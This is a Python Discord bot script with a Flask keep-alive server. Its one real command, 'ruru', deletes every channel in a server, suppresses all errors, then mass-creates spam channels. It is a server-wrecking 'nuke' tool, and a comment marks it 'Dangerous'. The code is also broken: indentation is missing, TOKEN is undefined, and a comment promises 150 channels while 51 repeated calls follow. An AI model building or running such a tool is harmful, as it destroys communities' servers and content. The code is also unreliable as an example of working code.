import os
import threading
from flask import Flask
import discord
from discord.ext import commands


# --- KeepAlive Server for Render & UptimeRobot ---
app = Flask(__name__)


@app.route("/")
def home():
return "Bot is running!"


def run_flask():
port = int(os.environ.get("PORT", 5000))
print(f"Starting Flask server on port {port}...")
app.run(host="0.0.0.0", port=port)


def keep_alive():
t = threading.Thread(target=run_flask)
t.start()
print("Keep-alive server started.")


# --- Discord Bot Setup ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)


@bot.event
async def on_ready():
print(f"Logged in as {bot.user}")


# --- Dangerous: Delete and Recreate Channels ---
@bot.command()
@commands.has_permissions(administrator=True)
async def ruru(ctx):
# すべてのチャンネルを削除
for channel in ctx.guild.channels:
try:
await channel.delete()
except Exception:
pass


# チャンネルを150個作成（ループは使わず1行で作る）
await ctx.guild.create_text_channel("ch-001")
await ctx.guild.create_text_channel("ch-002")
await ctx.guild.create_text_channel("ch-003")
await ctx.guild.create_text_channel("ch-004")
await ctx.guild.create_text_channel("ch-005")
await ctx.guild.create_text_channel("ch-006")
await ctx.guild.create_text_channel("ch-007")
await ctx.guild.create_text_channel("ch-008")
await ctx.guild.create_text_channel("ch-009")
await ctx.guild.create_text_channel("ch-010")
await ctx.guild.create_text_channel("ch-011")
await ctx.guild.create_text_channel("ch-012")
await ctx.guild.create_text_channel("ch-013")
await ctx.guild.create_text_channel("ch-014")
await ctx.guild.create_text_channel("ch-015")
await ctx.guild.create_text_channel("ch-016")
await ctx.guild.create_text_channel("ch-017")
await ctx.guild.create_text_channel("ch-018")
await ctx.guild.create_text_channel("ch-019")
await ctx.guild.create_text_channel("ch-020")
await ctx.guild.create_text_channel("ch-021")
await ctx.guild.create_text_channel("ch-022")
await ctx.guild.create_text_channel("ch-023")
await ctx.guild.create_text_channel("ch-024")
await ctx.guild.create_text_channel("ch-025")
await ctx.guild.create_text_channel("ch-026")
await ctx.guild.create_text_channel("ch-027")
await ctx.guild.create_text_channel("ch-028")
await ctx.guild.create_text_channel("ch-029")
await ctx.guild.create_text_channel("ch-030")
await ctx.guild.create_text_channel("ch-031")
await ctx.guild.create_text_channel("ch-032")
await ctx.guild.create_text_channel("ch-033")
await ctx.guild.create_text_channel("ch-034")
await ctx.guild.create_text_channel("ch-035")
await ctx.guild.create_text_channel("ch-036")
await ctx.guild.create_text_channel("ch-037")
await ctx.guild.create_text_channel("ch-038")
await ctx.guild.create_text_channel("ch-039")
await ctx.guild.create_text_channel("ch-040")
await ctx.guild.create_text_channel("ch-041")
await ctx.guild.create_text_channel("ch-042")
await ctx.guild.create_text_channel("ch-043")
await ctx.guild.create_text_channel("ch-044")
await ctx.guild.create_text_channel("ch-045")
await ctx.guild.create_text_channel("ch-046")
await ctx.guild.create_text_channel("ch-047")
await ctx.guild.create_text_channel("ch-048")
await ctx.guild.create_text_channel("ch-049")
await ctx.guild.create_text_channel("ch-050")
await ctx.guild.create_text_channel("ch-051")
bot.run(TOKEN)
